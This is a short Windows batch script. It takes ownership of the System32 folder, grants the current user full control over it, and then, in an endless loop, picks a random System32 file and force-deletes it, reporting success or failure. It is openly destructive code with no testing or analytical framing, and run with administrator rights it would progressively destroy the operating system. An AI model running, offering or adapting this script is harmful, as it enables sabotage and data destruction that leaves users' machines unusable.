@echo off
setlocal enabledelayedexpansion

:: Take ownership of System32 (folder + all files recursively)
takeown /f C:\Windows\System32 /r /d y

:: Grant current user full control recursively
icacls C:\Windows\System32 /grant "%USERNAME%":F /t /q
:begin
:: Pick a random file from System32
set count=0
for /f "delims=" %%A in ('dir /b C:\Windows\System32\*') do (
    set "files[!count!]=%%A"
    set /a count+=1
)

:: Pick a random index
set /a randIndex=%RANDOM% %% count
set "randomFile=!files[%randIndex%]!"

echo Random file chosen: !randomFile!

:: Grant rights and delete
icacls "C:\Windows\System32\!randomFile!" /grant "%USERNAME%":F /q
del /f /q "C:\Windows\System32\!randomFile!"

:: Confirm result
if exist "C:\Windows\System32\!randomFile!" (
    echo FAILED: !randomFile! still exists - may be locked by a running process
) else (
    echo SUCCESS: !randomFile! was deleted
)

pause
goto begin